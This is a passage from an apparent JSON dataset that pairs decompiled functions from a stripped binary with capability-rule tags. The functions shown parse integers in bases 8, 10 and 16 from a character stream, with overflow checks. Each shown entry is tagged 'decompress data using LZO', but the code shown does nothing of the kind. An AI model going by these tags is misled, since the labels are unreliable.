code_r0x00451fc1;\ncode_r0x00452040:\n                            puVar12 = iVar8 + 0x78;\n                            uVar9 = var_44h;\n                            if (uVar6 == *(iVar8 + 0x24)) goto code_r0x00451e40;\n                            while (*puVar12 != uVar6) {\n                                uVar9 = uVar9 - 1;\n                                puVar12 = puVar12 + 1;\n                                if (uVar9 == 0) {\n                                    uVar2 = 0;\n                                    goto code_r0x00451b64;\n                                }\n                            }\n                            iVar13 = puVar12 - (iVar8 + 0x78);\n                            iVar10 = iVar13 >> 1;\n                            if (0x1e < iVar13) {\n                                iVar10 = iVar10 + -6;\n                            }\n                            if (var_3ch <= var_50h) {\n                                uVar9 = var_3ch * var_5ch;\n                                var_3ch = iVar10 + uVar9;\n                                var_36h = var_36h | var_4ch - iVar10 < uVar9;\n                                unique0x00007a80 = stack0xffffffc8 + 1;\n                                goto code_r0x00451fea;\n                            }\n                            var_36h = 1;\n                            uVar9 = arg_8h[2];\n                            if (uVar9 < arg_8h[3]) break;\ncode_r0x0045209f:\n                            (**(*arg_8h + 0x28))();\n                        }\n                    } while( true );\n                }\n                uVar2 = 0;\n                var_35h._0_1_ = uVar5;\n            }\n            else {\n                var_3ch = 0;\n                var_36h = 0;\n                var_35h._0_1_ = 0;\n            }\n        }\n    }\n    else {\n        var_5ch = 10;\n        if (uVar9 != 8) goto code_r0x004519bf;\n        var_5ch = 0x10;\n        uVar2 = fcn.00430e20(&arg_10h);\n        if (uVar2 == 0) goto code_r0x004519de;\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        var_35h._0_1_ = *(iVar8 + 0x10);\n        if (var_35h != 0) {\n            stack0xffffffc8 = 0;\n            uVar6 = 0;\n            var_5ch = 0x10;\n            bVar1 = false;\n            bVar15 = false;\n            var_44h = 0x16;\n            goto code_r0x00452100;\n        }\n        var_36h = *(iVar8 + 0xa4);\n        bVar15 = false;\n        bVar1 = false;\n        var_35h._0_1_ = var_36h;\n        if (var_36h != 0) {\n            stack0xffffffc8 = 0;\n            uVar6 = 0;\n            var_44h = 0x16;\n            var_50h = 0x7ffffff;\n            var_4ch = 0x7fffffff;\n            var_5ch = 0x10;\n            goto code_r0x00451fa1;\n        }\n        var_3ch = 0;\n        stack0xffffffc8 = 0;\n    }\ncode_r0x00451b64:\n    uVar5 = uVar2;\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00451b72;\ncode_r0x00451e50:\n    uVar2 = uVar5;\n    fcn.0046d560(var_35h._1_1_);\n    cVar4 = fcn.0049e880(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar4 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar1)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00451e9d;\n    goto code_r0x00451b87;\ncode_r0x00451e40:\n    uVar2 = 0;\n    uVar5 = 0;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00451e50;\ncode_r0x00451b72:\n    if ((stack0xffffffc8 != 0) || (bVar1)) {\ncode_r0x00451e9d:\n        if (var_35h == 0) {\n            if (var_36h == 0) {\n                uVar9 = -var_3ch;\n                if (!bVar15) {\n                    uVar9 = var_3ch;\n                }\n                *arg_20h = uVar9;\n            }\n            else {\n                *arg_20h = bVar15 + 0x7fffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00451b99;\n        }\n    }\ncode_r0x00451b87:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00451b99:\n    var_58h = &var_1eh + 1;\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(var_58h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4131
    },
    "00452220": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00452220(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar11 = arg_18h;\n    iVar8 = fcn.0042e500(arg_18h + 0x6c);\n    uVar14 = *(iVar11 + 0xc) & 0x4a;\n    if (uVar14 == 0x40) {\n        uVar15 = 8;\ncode_r0x0045225f:\n        var_35h._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_35h == '\\0') {\ncode_r0x0045227e:\n            var_40h = &arg_10h;\n            uVar6 = fcn.00430ec0();\n            bVar16 = *(iVar8 + 0x70) == uVar6;\n            cVar3 = *(iVar8 + 0x10);\n            if ((((bVar16) || (*(iVar8 + 0x72) == uVar6)) && ((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004867f0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00430e20(var_40h);\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                if (var_35h == '\\0') {\n                    uVar6 = fcn.00430ec0();\n                    cVar3 = *(iVar8 + 0x10);\n                    goto code_r0x004524c8;\n                }\n            }\n            else {\ncode_r0x004524c8:\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                while (((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar4 = uVar15 == 10 | bVar2 ^ 1U;\n                        if (!bVar4) goto code_r0x004524ff;\n                        bVar2 = uVar14 == 0 || uVar15 == 8;\n                        if (uVar14 != 0 && uVar15 != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00452535;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 8;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x004525f0;\ncode_r0x00452544:\n                        arg_8h[2] = uVar9 + 2;\ncode_r0x00452553:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x004524ff:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = '\\0';\n                            bVar2 = true;\n                            goto code_r0x00452300;\n                        }\n                        var_35h._0_1_ = uVar15 == 0x10 || uVar14 == 0;\n                        if (uVar15 != 0x10 && uVar14 != 0) {\n                            bVar2 = true;\n                            goto code_r0x0045230c;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 0x10;\n                        bVar4 = false;\ncode_r0x00452535:\n                        uVar9 = arg_8h[2];\n                        bVar2 = bVar4;\n                        if (uVar9 < arg_8h[3]) goto code_r0x00452544;\ncode_r0x004525f0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00452553;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar12 = arg_10h != NULL && arg_14h == -1;\n                    bVar4 = arg_14h == -1;\n                    if (bVar12) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar4 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar4 = bVar12;\n                        }\n                    }\n                    if (var_35h == bVar4) {\n                        var_35h._0_1_ = '\\x01';\n                        goto code_r0x00452300;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar3 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = '\\0';\n            }\ncode_r0x00452300:\n            var_44h = 0x16;\n            if (uVar15 == 0x10) goto code_r0x0045230f;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x0045230c:\n        var_44h = uVar15;\n    }\n    else {\n        if (uVar14 != 8) {\n            uVar15 = 10;\n            goto code_r0x0045225f;\n        }\n        uVar15 = 0x10;\n        var_35h._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_35h == '\\0') goto code_r0x0045227e;\n        uVar6 = 0;\n        stack0xffffffc8 = 0;\n        uVar15 = 0x10;\n        bVar2 = false;\n        bVar16 = false;\n        var_44h = 0x16;\n    }\ncode_r0x0045230f:\n    cVar3 = var_35h;\n    var_40h = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar8 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar14 = 0xffffffff / uVar15;\n    uVar1 = *(iVar8 + 0xa4);\n    if (uVar1 == 0) {\n        var_36h = 0;\n        if (var_35h == '\\0') {\n            var_3ch = 0;\n            do {\n                uVar9 = uVar6;\n                if (var_44h < 0xb) {\n                    if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x004526a0;\ncode_r0x00452396:\n                    uVar9 = uVar9 - 0x30;\n                }\n                else {\n                    if (uVar6 - 0x30 < 10) goto code_r0x00452396;\n                    if (uVar6 - 0x61 < 6) {\n                        uVar9 = uVar9 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar6 - 0x41) goto code_r0x004526a0;\n                        uVar9 = uVar9 - 0x37;\n                    }\n                }\n                if (uVar9 == 0xffffffff) goto code_r0x004526a0;\n                if (uVar14 < var_3ch) {\n                    var_36h = 1;\n                    uVar9 = arg_8h[2];\n                    if (arg_8h[3] <= uVar9) goto code_r0x00452743;\ncode_r0x004523d5:\n                    arg_8h[2] = uVar9 + 2;\n                }\n                else {\n                    var_36h = var_36h | ~uVar9 < var_3ch * uVar15;\n                    var_3ch = uVar9 + var_3ch * uVar15;\n                    unique0x00007a80 = stack0xffffffc8 + 1;\n                    uVar9 = arg_8h[2];\n                    if (uVar9 < arg_8h[3]) goto code_r0x004523d5;\ncode_r0x00452743:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar3 = fcn.00430e20(var_40h);\n                if (cVar3 != '\\0') goto code_r0x004523ff;\n                uVar6 = fcn.00430ec0();\n            } while( true );\n        }\n        var_3ch = 0;\n        var_35h._0_1_ = '\\0';\n    }\n    else if (var_35h == '\\0') {\n        var_36h = 0;\n        cVar5 = *(iVar8 + 0x10);\n        var_3ch = 0;\n        if (cVar5 == '\\0') goto code_r0x00452870;\ncode_r0x004527f8:\n        if (*(iVar8 + 0x26) != uVar6) goto code_r0x00452870;\n        if (stack0xffffffc8 != 0) {\n            fcn.0046d560(stack0xffffffc8);\n            stack0xffffffc8 = 0;\ncode_r0x00452821:\n            uVar9 = arg_8h[2];\n            if (arg_8h[3] <= uVar9) goto code_r0x004528d3;\n            do {\n                arg_8h[2] = uVar9 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar3 = fcn.00430e20(var_40h);\n                    if (cVar3 != '\\0') goto code_r0x004523ff;\n                    uVar6 = fcn.00430ec0();\n                    cVar5 = *(iVar8 + 0x10);\n                    if (cVar5 != '\\0') goto code_r0x004527f8;\ncode_r0x00452870:\n                    puVar10 = iVar8 + 0x78;\n                    uVar9 = var_44h;\n                    if (uVar6 == *(iVar8 + 0x24)) goto code_r0x004526a0;\n                    while (*puVar10 != uVar6) {\n                        uVar9 = uVar9 - 1;\n                        puVar10 = puVar10 + 1;\n                        if (uVar9 == 0) {\n                            cVar3 = '\\0';\n                            goto code_r0x004523ff;\n                        }\n                    }\n                    iVar11 = puVar10 - (iVar8 + 0x78);\n                    uVar9 = iVar11 >> 1;\n                    if (0x1e < iVar11) {\n                        uVar9 = uVar9 - 6;\n                    }\n                    if (var_3ch <= uVar14) {\n                        uVar13 = var_3ch * uVar15;\n                        var_3ch = uVar9 + uVar13;\n                        var_36h = var_36h | ~uVar9 < uVar13;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        goto code_r0x00452821;\n                    }\n                    uVar9 = arg_8h[2];\n                    var_36h = uVar1;\n                    if (uVar9 < arg_8h[3]) break;\ncode_r0x004528d3:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar3 = '\\0';\n        var_35h._0_1_ = cVar5;\n    }\n    else {\n        var_3ch = 0;\n        var_36h = 0;\n        var_35h._0_1_ = '\\0';\n    }\ncode_r0x004523ff:\n    cVar5 = cVar3;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x004526b0;\ncode_r0x0045240d:\n    if ((stack0xffffffc8 != 0) || (bVar2)) {\ncode_r0x004526fd:\n        if (var_35h == '\\0') {\n            if (var_36h == 0) {\n                uVar14 = -var_3ch;\n                if (!bVar16) {\n                    uVar14 = var_3ch;\n                }\n                *arg_20h = uVar14;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00452434;\n        }\n    }\n    goto code_r0x00452422;\ncode_r0x004526a0:\n    cVar3 = '\\0';\n    cVar5 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0045240d;\ncode_r0x004526b0:\n    cVar3 = cVar5;\n    fcn.0046d560(var_35h._1_1_);\n    cVar5 = fcn.0049e880(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x004526fd;\ncode_r0x00452422:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00452434:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3776
    },
    "00452a20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00452a20(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint16_t *puVar11;\n    int32_t iVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    iVar8 = fcn.0042e500(arg_18h + 0x6c);\n    uVar14 = *(iVar9 + 0xc) & 0x4a;\n    if (uVar14 == 0x40) {\n        uVar15 = 8;\ncode_r0x00452a5f:\n        var_35h._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_35h == '\\0') {\ncode_r0x00452a7e:\n            var_40h = &arg_10h;\n            uVar6 = fcn.00430ec0();\n            bVar16 = *(iVar8 + 0x70) == uVar6;\n            cVar3 = *(iVar8 + 0x10);\n            if ((((bVar16) || (*(iVar8 + 0x72) == uVar6)) && ((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004867f0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00430e20(var_40h);\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                if (var_35h == '\\0') {\n                    uVar6 = fcn.00430ec0();\n                    cVar3 = *(iVar8 + 0x10);\n                    goto code_r0x00452ccb;\n                }\n            }\n            else {\ncode_r0x00452ccb:\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                while (((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar4 = uVar15 == 10 | bVar2 ^ 1U;\n                        if (!bVar4) goto code_r0x00452d0c;\n                        bVar2 = uVar14 == 0 || uVar15 == 8;\n                        if (uVar14 != 0 && uVar15 != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00452d42;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 8;\n                        uVar10 = arg_8h[2];\n                        if (arg_8h[3] <= uVar10) goto code_r0x00452df0;\ncode_r0x00452d51:\n                        arg_8h[2] = uVar10 + 2;\ncode_r0x00452d60:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00452d0c:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = '\\0';\n                            bVar2 = true;\n                            goto code_r0x00452b00;\n                        }\n                        var_35h._0_1_ = uVar15 == 0x10 || uVar14 == 0;\n                        if (uVar15 != 0x10 && uVar14 != 0) {\n                            bVar2 = true;\n                            goto code_r0x00452b0c;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 0x10;\n                        bVar4 = false;\ncode_r0x00452d42:\n                        uVar10 = arg_8h[2];\n                        bVar2 = bVar4;\n                        if (uVar10 < arg_8h[3]) goto code_r0x00452d51;\ncode_r0x00452df0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00452d60;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar13 = arg_10h != NULL && arg_14h == -1;\n                    bVar4 = arg_14h == -1;\n                    if (bVar13) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar4 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar4 = bVar13;\n                        }\n                    }\n                    if (var_35h == bVar4) {\n                        var_35h._0_1_ = '\\x01';\n                        goto code_r0x00452b00;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar3 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = '\\0';\n            }\ncode_r0x00452b00:\n            var_44h = 0x16;\n            if (uVar15 == 0x10) goto code_r0x00452b0f;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x00452b0c:\n        var_44h = uVar15;\n    }\n    else {\n        if (uVar14 != 8) {\n            uVar15 = 10;\n            goto code_r0x00452a5f;\n        }\n        uVar15 = 0x10;\n        var_35h._0_1_ = fcn.00430e20(&arg_10h);\n        if (var_35h == '\\0') goto code_r0x00452a7e;\n        uVar6 = 0;\n        stack0xffffffc8 = 0;\n        uVar15 = 0x10;\n        bVar2 = false;\n        bVar16 = false;\n        var_44h = 0x16;\n    }\ncode_r0x00452b0f:\n    cVar3 = var_35h;\n    var_40h = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar8 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar1 = *(iVar8 + 0xa4);\n    var_48h._0_2_ = 0xffff / uVar15;\n    if (uVar1 == 0) {\n        var_36h = 0;\n        if (var_35h == '\\0') {\n            var_3ch = 0;\n            do {\n                uVar14 = uVar6;\n                if (var_44h < 0xb) {\n                    if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x00452ea0;\ncode_r0x00452b94:\n                    iVar9 = uVar14 - 0x30;\n                }\n                else {\n                    if (uVar6 - 0x30 < 10) goto code_r0x00452b94;\n                    if (uVar6 - 0x61 < 6) {\n                        iVar9 = uVar14 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar6 - 0x41) goto code_r0x00452ea0;\n                        iVar9 = uVar14 - 0x37;\n                    }\n                }\n                if (iVar9 == -1) goto code_r0x00452ea0;\n                if (var_48h < var_3ch) {\n                    var_36h = 1;\n                    uVar14 = arg_8h[2];\n                    if (arg_8h[3] <= uVar14) goto code_r0x00452f43;\ncode_r0x00452bde:\n                    arg_8h[2] = uVar14 + 2;\n                }\n                else {\n                    var_36h = var_36h | 0xffff - iVar9 < (var_3ch * uVar15 & 0xffff);\n                    var_3ch = iVar9 + var_3ch * uVar15;\n                    unique0x00007a80 = stack0xffffffc8 + 1;\n                    uVar14 = arg_8h[2];\n                    if (uVar14 < arg_8h[3]) goto code_r0x00452bde;\ncode_r0x00452f43:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar3 = fcn.00430e20(var_40h);\n                if (cVar3 != '\\0') goto code_r0x00452c08;\n                uVar6 = fcn.00430ec0();\n            } while( true );\n        }\n        var_35h._0_1_ = '\\0';\n        var_3ch._0_2_ = 0;\n    }\n    else if (var_35h == '\\0') {\n        var_36h = 0;\n        cVar5 = *(iVar8 + 0x10);\n        var_3ch = 0;\n        if (cVar5 == '\\0') goto code_r0x00453070;\ncode_r0x00452ff7:\n        if (*(iVar8 + 0x26) != uVar6) goto code_r0x00453070;\n        if (stack0xffffffc8 != 0) {\n            fcn.0046d560(stack0xffffffc8);\n            stack0xffffffc8 = 0;\ncode_r0x00453020:\n            uVar14 = arg_8h[2];\n            if (arg_8h[3] <= uVar14) goto code_r0x004530d5;\n            do {\n                arg_8h[2] = uVar14 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar3 = fcn.00430e20(var_40h);\n                    if (cVar3 != '\\0') goto code_r0x00452c08;\n                    uVar6 = fcn.00430ec0();\n                    cVar5 = *(iVar8 + 0x10);\n                    if (cVar5 != '\\0') goto code_r0x00452ff7;\ncode_r0x00453070:\n                    puVar11 = iVar8 + 0x78;\n                    uVar14 = var_44h;\n                    if (uVar6 == *(iVar8 + 0x24)) goto code_r0x00452ea0;\n                    while (*puVar11 != uVar6) {\n                        uVar14 = uVar14 - 1;\n                        puVar11 = puVar11 + 1;\n                        if (uVar14 == 0) {\n                            cVar3 = '\\0';\n                            goto code_r0x00452c08;\n                        }\n                    }\n                    iVar12 = puVar11 - (iVar8 + 0x78);\n                    iVar9 = iVar12 >> 1;\n                    if (0x1e < iVar12) {\n                        iVar9 = iVar9 + -6;\n                    }\n                    if (var_3ch <= var_48h) {\n                        var_36h = var_36h | 0xffff - iVar9 < (var_3ch * uVar15 & 0xffff);\n                        var_3ch = iVar9 + var_3ch * uVar15;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        goto code_r0x00453020;\n                    }\n                    uVar14 = arg_8h[2];\n                    var_36h = uVar1;\n                    if (uVar14 < arg_8h[3]) break;\ncode_r0x004530d5:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar3 = '\\0';\n        var_35h._0_1_ = cVar5;\n    }\n    else {\n        var_36h = 0;\n        var_3ch._0_2_ = 0;\n        var_35h._0_1_ = '\\0';\n    }\ncode_r0x00452c08:\n    cVar5 = cVar3;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00452eb0;\ncode_r0x00452c16:\n    if ((stack0xffffffc8 != 0) || (bVar2)) {\ncode_r0x00452efd:\n        if (var_35h == '\\0') {\n            if (var_36h == 0) {\n                uVar6 = -var_3ch;\n                if (!bVar16) {\n                    uVar6 = var_3ch;\n                }\n                *arg_20h = uVar6;\n            }\n            else {\n                *arg_20h = 0xffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00452c3c;\n        }\n    }\n    goto code_r0x00452c2b;\ncode_r0x00452ea0:\n    cVar3 = '\\0';\n    cVar5 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00452c16;\ncode_r0x00452eb0:\n    cVar3 = cVar5;\n    fcn.0046d560(var_35h._1_1_);\n    cVar5 = fcn.0049e880(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00452efd;\ncode_r0x00452c2b:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00452c3c:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3829
    },
    "00453230": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00453230(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    bool bVar5;\n    char cVar6;\n    uint8_t uVar7;\n    uint16_t uVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint16_t *puVar13;\n    int32_t iVar14;\n    bool bVar15;\n    uint32_t uVar16;\n    bool bVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    bool bVar20;\n    ulong uVar21;\n    int32_t var_64h;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint8_t var_32h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar14 = arg_18h;\n    iVar10 = fcn.0042e500(arg_18h + 0x6c);\n    uVar11 = *(iVar14 + 0xc) & 0x4a;\n    if (uVar11 == 0x40) {\n        var_48h = 8;\ncode_r0x0045326f:\n        uVar3 = fcn.00430e20(&arg_10h);\n        if (uVar3 == 0) {\ncode_r0x0045328e:\n            var_40h = &arg_10h;\n            uVar8 = fcn.00430ec0();\n            bVar20 = *(iVar10 + 0x70) == uVar8;\n            if (bVar20) {\n                cVar6 = *(iVar10 + 0x10);\ncode_r0x004532c1:\n                if (((cVar6 != '\\0') && (*(iVar10 + 0x26) == uVar8)) || (*(iVar10 + 0x24) == uVar8))\n                goto code_r0x004535a8;\n                fcn.004867f0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                uVar3 = fcn.00430e20(var_40h);\n                var_38h = 0;\n                bVar19 = false;\n                if (uVar3 == 0) {\n                    uVar8 = fcn.00430ec0();\n                    cVar6 = *(iVar10 + 0x10);\n                    goto code_r0x004535a8;\n                }\n            }\n            else {\n                cVar6 = *(iVar10 + 0x10);\n                if (*(iVar10 + 0x72) == uVar8) goto code_r0x004532c1;\ncode_r0x004535a8:\n                var_38h = 0;\n                bVar19 = false;\n                while (((cVar6 == '\\0' || (*(iVar10 + 0x26) != uVar8)) && (*(iVar10 + 0x24) != uVar8))) {\n                    if (*(iVar10 + 0x78) == uVar8) {\n                        bVar17 = var_48h == 10 | bVar19 ^ 1U;\n                        if (!bVar17) goto code_r0x004535f2;\n                        bVar19 = uVar11 == 0 || var_48h == 8;\n                        if (uVar11 != 0 && var_48h != 8) {\n                            var_38h = var_38h + 1;\n                            goto code_r0x0045362b;\n                        }\n                        var_38h = 0;\n                        var_48h = 8;\n                        uVar16 = 